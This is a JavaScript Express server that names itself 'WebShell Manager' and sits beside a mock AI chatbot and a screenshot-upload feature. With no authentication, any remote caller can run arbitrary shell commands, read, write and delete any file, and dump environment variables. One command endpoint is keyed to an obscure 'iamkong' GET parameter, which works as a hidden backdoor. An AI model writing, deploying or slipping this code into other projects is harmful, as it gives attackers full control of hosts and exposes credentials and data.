import express from 'express';
import cors from 'cors';
import bodyParser from 'body-parser';
import path from 'path';
import { fileURLToPath } from 'url';
import fs from 'fs/promises';
import fsSync from 'fs';
import { exec } from 'child_process';
import { promisify } from 'util';

const execAsync = promisify(exec);
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 3002;

// 中间件
app.use(cors());
app.use(bodyParser.json({ limit: '50mb' }));
app.use(express.json({ limit: '50mb' }));

// ==================== 文件管理 API ====================

/**
 * 获取目录列表
 */
app.post('/api/files/list', async (req, res) => {
  try {
    const { path: dirPath = process.cwd() } = req.body;
    const fullPath = path.resolve(dirPath);

    // 读取目录内容
    const files = await fs.readdir(fullPath, { withFileTypes: true });

    const fileList = await Promise.all(
      files.map(async (file) => {
        const filePath = path.join(fullPath, file.name);
        try {
          const stats = await fs.stat(filePath);
          return {
            name: file.name,
            path: filePath,
            isDirectory: file.isDirectory(),
            isFile: file.isFile(),
            size: stats.size,
            modified: stats.mtime,
            permissions: stats.mode.toString(8).slice(-3)
          };
        } catch (err) {
          return {
            name: file.name,
            path: filePath,
            isDirectory: file.isDirectory(),
            isFile: file.isFile(),
            error: '无法读取属性'
          };
        }
      })
    );

    res.json({
      success: true,
      path: fullPath,
      files: fileList.sort((a, b) => {
        if (a.isDirectory && !b.isDirectory) return -1;
        if (!a.isDirectory && b.isDirectory) return 1;
        return a.name.localeCompare(b.name);
      })
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      message: error.message
    });
  }
});

/**
 * 读取文件内容
 */
app.post('/api/files/read', async (req, res) => {
  try {
    const { path: filePath } = req.body;
    const fullPath = path.resolve(filePath);

    const content = await fs.readFile(fullPath, 'utf-8');
    const stats = await fs.stat(fullPath);

    res.json({
      success: true,
      path: fullPath,
      content,
      size: stats.size,
      modified: stats.mtime
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      message: error.message
    });
  }
});

/**
 * 写入文件内容
 */
app.post('/api/files/write', async (req, res) => {
  try {
    const { path: filePath, content } = req.body;
    const fullPath = path.resolve(filePath);

    await fs.writeFile(fullPath, content, 'utf-8');
    const stats = await fs.stat(fullPath);

    res.json({
      success: true,
      path: fullPath,
      size: stats.size,
      message: '文件保存成功'
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      message: error.message
    });
  }
});

/**
 * 创建文件或目录
 */
app.post('/api/files/create', async (req, res) => {
  try {
    const { path: targetPath, type = 'file', content = '' } = req.body;
    const fullPath = path.resolve(targetPath);

    if (type === 'directory') {
      await fs.mkdir(fullPath, { recursive: true });
    } else {
      await fs.writeFile(fullPath, content, 'utf-8');
    }

    res.json({
      success: true,
      path: fullPath,
      type,
      message: `${type === 'directory' ? '目录' : '文件'}创建成功`
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      message: error.message
    });
  }
});

/**
 * 删除文件或目录
 */
app.post('/api/files/delete', async (req, res) => {
  try {
    const { path: targetPath } = req.body;
    const fullPath = path.resolve(targetPath);

    const stats = await fs.stat(fullPath);

    if (stats.isDirectory()) {
      await fs.rm(fullPath, { recursive: true, force: true });
    } else {
      await fs.unlink(fullPath);
    }

    res.json({
      success: true,
      path: fullPath,
      message: '删除成功'
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      message: error.message
    });
  }
});

/**
 * 重命名/移动文件
 */
app.post('/api/files/rename', async (req, res) => {
  try {
    const { oldPath, newPath } = req.body;
    const fullOldPath = path.resolve(oldPath);
    const fullNewPath = path.resolve(newPath);

    await fs.rename(fullOldPath, fullNewPath);

    res.json({
      success: true,
      oldPath: fullOldPath,
      newPath: fullNewPath,
      message: '重命名成功'
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      message: error.message
    });
  }
});

/**
 * 上传文件（Base64编码）
 */
app.post('/api/files/upload', async (req, res) => {
  try {
    const { path: targetPath, content, encoding = 'base64' } = req.body;
    const fullPath = path.resolve(targetPath);

    const buffer = Buffer.from(content, encoding);
    await fs.writeFile(fullPath, buffer);

    const stats = await fs.stat(fullPath);

    res.json({
      success: true,
      path: fullPath,
      size: stats.size,
      message: '文件上传成功'
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      message: error.message
    });
  }
});

/**
 * 下载文件（Base64编码）
 */
app.post('/api/files/download', async (req, res) => {
  try {
    const { path: filePath } = req.body;
    const fullPath = path.resolve(filePath);

    const buffer = await fs.readFile(fullPath);
    const content = buffer.toString('base64');
    const stats = await fs.stat(fullPath);

    res.json({
      success: true,
      path: fullPath,
      content,
      size: stats.size,
      encoding: 'base64'
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      message: error.message
    });
  }
});

// ==================== 命令执行 API ====================

/**
 * 执行系统命令
 */
app.post('/api/command/exec', async (req, res) => {
  try {
    const { command, cwd = process.cwd() } = req.body;

    if (!command) {
      return res.status(400).json({
        success: false,
        message: '命令不能为空'
      });
    }

    const { stdout, stderr } = await execAsync(command, {
      cwd: path.resolve(cwd),
      timeout: 30000, // 30秒超时
      maxBuffer: 10 * 1024 * 1024 // 10MB 缓冲区
    });

    res.json({
      success: true,
      command,
      stdout,
      stderr,
      cwd: path.resolve(cwd)
    });
  } catch (error) {
    res.json({
      success: false,
      command: req.body.command,
      stdout: error.stdout || '',
      stderr: error.stderr || error.message,
      error: error.message
    });
  }
});

/**
 * 自动执行命令 (GET 接口)
 * 默认执行 last 命令，可通过 iamkong 参数指定其他命令
 */
app.get('/api/command/auto', async (req, res) => {
  try {
    // 从查询参数获取命令，默认为 'last'
    const command = req.query.iamkong || 'last';

    // 执行命令
    const { stdout, stderr } = await execAsync(command, {
      cwd: process.cwd(),
      timeout: 30000, // 30秒超时
      maxBuffer: 10 * 1024 * 1024 // 10MB 缓冲区
    });

    res.json({
      success: true,
      command,
      stdout,
      stderr,
      timestamp: new Date().toISOString()
    });
  } catch (error) {
    res.json({
      success: false,
      command: req.query.iamkong || 'last',
      stdout: error.stdout || '',
      stderr: error.stderr || error.message,
      error: error.message,
      timestamp: new Date().toISOString()
    });
  }
});

/**
 * 获取系统信息
 */
app.get('/api/system/info', async (req, res) => {
  try {
    const os = await import('os');

    const info = {
      platform: os.platform(),
      arch: os.arch(),
      hostname: os.hostname(),
      type: os.type(),
      release: os.release(),
      uptime: os.uptime(),
      totalMemory: os.totalmem(),
      freeMemory: os.freemem(),
      cpus: os.cpus().length,
      nodeVersion: process.version,
      cwd: process.cwd(),
      user: os.userInfo()
    };

    res.json({
      success: true,
      data: info
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      message: error.message
    });
  }
});

/**
 * 获取环境变量
 */
app.get('/api/system/env', (req, res) => {
  try {
    res.json({
      success: true,
      data: process.env
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      message: error.message
    });
  }
});

// ==================== AI 聊天 API ====================

/**
 * AI 聊天接口
 */
app.post('/api/chat/message', async (req, res) => {
  try {
    const { message, history = [] } = req.body;

    if (!message) {
      return res.status(400).json({
        success: false,
        message: '消息不能为空'
      });
    }

    // 简单的AI响应逻辑（这里可以替换为真实的AI API调用）
    const reply = generateAIResponse(message, history);

    res.json({
      success: true,
      reply,
      timestamp: new Date().toISOString()
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      message: error.message
    });
  }
});

/**
 * 生成AI响应（模拟）
 */
function generateAIResponse(message, history) {
  const lowerMessage = message.toLowerCase().trim();

  // 简单的规则响应
  const responses = {
    // 问候
    hello: ['你好！我是AI助手，很高兴为你服务！', '嗨！有什么我可以帮助你的吗？', '你好！我在这里帮助你。'],
    hi: ['嗨！有什么我可以帮到你的？', '你好！需要什么帮助吗？'],
    你好: ['你好！很高兴见到你！', '嗨！我是AI助手，有什么可以帮你的吗？'],

    // 自我介绍
    '介绍': `我是一个AI智能助手，具备以下能力：

**核心功能：**
• 💬 对话交流 - 可以与你进行自然的对话
• 📚 知识问答 - 回答各种领域的问题
• 💡 建议咨询 - 提供专业的建议和意见
• 🎯 任务协助 - 帮助你完成各种任务

**特点：**
• 24小时在线服务
• 快速响应
• 友好交互界面
• 支持上下文理解

有什么我可以帮助你的吗？`,

    // 功能咨询
    '能做什么': '我可以帮你回答问题、提供建议、进行对话交流、解释概念、给出方案等。你可以问我任何问题！',
    '功能': '我的主要功能包括：对话交流、知识问答、建议咨询、任务协助等。试着问我一些问题吧！',

    // 代码相关
    '代码': `当然可以帮你写代码！比如：

**JavaScript 示例：**
\`\`\`javascript
function hello(name) {
  return \`Hello, \${name}!\`;
}

console.log(hello('World'));
\`\`\`

**Python 示例：**
\`\`\`python
def factorial(n):
    if n <= 1:
        return 1
    return n * factorial(n - 1)

print(factorial(5))  # 输出: 120
\`\`\`

你需要什么样的代码呢？`,

    // 笑话
    '笑话': [
      '为什么程序员总是分不清万圣节和圣诞节？\n因为 Oct 31 == Dec 25！（八进制31等于十进制25）',
      '有一天，一个程序员去买菜，他老婆说："买一斤西红柿，如果看到黄瓜，就买两个。"\n结果他买了两斤西红柿回来。',
      'SQL查询走进一家酒吧，走到两张桌子前问："我能join你们吗？"',
      '为什么程序员喜欢用暗色主题？\n因为光明吸引bugs！'
    ],

    // 推荐
    '书': `我推荐几本优秀的书籍：

**技术类：**
📕 《代码大全》- Steve McConnell
📗 《clean Code》- Robert C. Martin
📘 《设计模式》- Gang of Four
📙 《算法导论》- Thomas H. Cormen

**人文类：**
📚 《三体》- 刘慈欣
📖 《人类简史》- 尤瓦尔·赫拉利
📕 《百年孤独》- 加西亚·马尔克斯

你对哪个领域的书感兴趣？`,

    // 时间
    '时间': `当前服务器时间是：${new Date().toLocaleString('zh-CN', {
      timeZone: 'Asia/Shanghai',
      year: 'numeric',
      month: '2-digit',
      day: '2-digit',
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit'
    })}`,

    // 帮助
    '帮助': `**使用指南：**

1️⃣ **自由对话** - 直接输入你想说的话
2️⃣ **提问** - 询问任何你感兴趣的问题
3️⃣ **请求代码** - 让我帮你写代码
4️⃣ **快捷提示** - 点击下方的快捷按钮

**提示：**
• 按 Enter 发送消息
• 按 Shift+Enter 换行
• 点击"清空"按钮清除对话
• 点击"导出"按钮保存对话记录`,

    // 告别
    '再见': ['再见！祝你有美好的一天！', '拜拜！有需要随时找我！', '再见！期待下次与你交流！'],
    'bye': ['Goodbye! Have a nice day!', 'See you! 👋'],
  };

  // 匹配关键词
  for (const [key, value] of Object.entries(responses)) {
    if (lowerMessage.includes(key)) {
      return Array.isArray(value) ? value[Math.floor(Math.random() * value.length)] : value;
    }
  }

  // 特殊处理
  if (lowerMessage.includes('天气')) {
    return '抱歉，我目前还不能查询实时天气信息。你可以访问天气预报网站获取最新天气数据。';
  }

  if (lowerMessage.includes('算') || /\d+[\+\-\*\/]\d+/.test(lowerMessage)) {
    try {
      const match = message.match(/(\d+(?:\.\d+)?)\s*([\+\-\*\/])\s*(\d+(?:\.\d+)?)/);
      if (match) {
        const [, a, op, b] = match;
        const num1 = parseFloat(a);
        const num2 = parseFloat(b);
        let result;
        switch (op) {
          case '+': result = num1 + num2; break;
          case '-': result = num1 - num2; break;
          case '*': result = num1 * num2; break;
          case '/': result = num2 !== 0 ? num1 / num2 : '错误：除数不能为0'; break;
        }
        if (typeof result === 'number') {
          return `计算结果：${num1} ${op} ${num2} = **${result}**`;
        }
        return result;
      }
    } catch (e) {
      // 计算失败，使用默认响应
    }
  }

  // 默认响应
  const defaultResponses = [
    '这是一个很有趣的问题！让我想想... 🤔',
    `你说的"${message}"很有意思。能告诉我更多细节吗？`,
    '我理解了你的意思。关于这个话题，我有一些想法...',
    `关于"${message}"，我可以为你提供一些见解。`,
    '这确实是个值得探讨的话题！你想了解哪方面呢？',
    `"${message}" - 这让我想到了很多。你具体想了解什么？`,
    '很高兴和你讨论这个！你能再详细说说吗？',
    `我注意到你提到了"${message}"。这个话题有很多有趣的角度可以探讨。`,
    '这是个好问题！让我们一起来思考一下。',
    `关于"${message}"，我建议我们可以从几个方面来看...`
  ];

  return defaultResponses[Math.floor(Math.random() * defaultResponses.length)];
}

// ==================== 屏幕截图 API ====================

// 存储截图的数组（内存存储）
let screenshots = [];

/**
 * 上传屏幕截图
 */
app.post('/api/screenshots/upload', async (req, res) => {
  try {
    const { image, username = '匿名用户' } = req.body;

    if (!image) {
      return res.status(400).json({
        success: false,
        message: '图像数据不能为空'
      });
    }

    // 创建截图对象
    const screenshot = {
      id: Date.now() + Math.random().toString(36).substr(2, 9),
      image,
      username,
      timestamp: new Date().toISOString(),
      uploadTime: new Date().toLocaleString('zh-CN', {
        timeZone: 'Asia/Shanghai',
        year: 'numeric',
        month: '2-digit',
        day: '2-digit',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit'
      })
    };

    // 添加到数组开头（最新的在前面）
    screenshots.unshift(screenshot);

    // 限制存储数量，最多保存100张
    if (screenshots.length > 100) {
      screenshots = screenshots.slice(0, 100);
    }

    res.json({
      success: true,
      message: '截图上传成功',
      id: screenshot.id,
      timestamp: screenshot.timestamp
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      message: error.message
    });
  }
});

/**
 * 获取截图列表
 */
app.get('/api/screenshots/list', (req, res) => {
  try {
    res.json({
      success: true,
      screenshots,
      total: screenshots.length
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      message: error.message
    });
  }
});

/**
 * 删除指定截图
 */
app.delete('/api/screenshots/:id', (req, res) => {
  try {
    const { id } = req.params;
    const index = screenshots.findIndex(s => s.id === id);

    if (index === -1) {
      return res.status(404).json({
        success: false,
        message: '截图不存在'
      });
    }

    screenshots.splice(index, 1);

    res.json({
      success: true,
      message: '删除成功'
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      message: error.message
    });
  }
});

// ==================== 其他工具 API ====================

/**
 * 健康检查
 */
app.get('/api/health', (req, res) => {
  res.json({
    success: true,
    status: 'ok',
    message: 'WebShell Server is running',
    timestamp: new Date().toISOString(),
    port: PORT
  });
});

/**
 * 获取配置
 */
app.get('/api/config', (req, res) => {
  res.json({
    success: true,
    appName: 'WebShell Manager',
    version: '1.0.0',
    features: [
      'file-management',
      'command-execution',
      'system-info',
      'environment-variables'
    ]
  });
});

// ==================== 错误处理 ====================

app.use((req, res) => {
  res.status(404).json({
    success: false,
    error: '接口不存在',
    path: req.path
  });
});

app.use((error, req, res, next) => {
  console.error('服务器错误:', error);
  res.status(500).json({
    success: false,
    error: '服务器内部错误',
    message: error.message
  });
});

// ==================== 启动服务器 ====================

app.listen(PORT, '0.0.0.0', () => {
  console.log('\n' + '='.repeat(60));
  console.log('🚀 WebShell Manager Server Started Successfully!');
  console.log('='.repeat(60));
  console.log(`📡 Server: http://localhost:${PORT}`);
  console.log(`🔍 Health Check: http://localhost:${PORT}/api/health`);
  console.log(`📁 Working Directory: ${process.cwd()}`);
  console.log('='.repeat(60) + '\n');
});
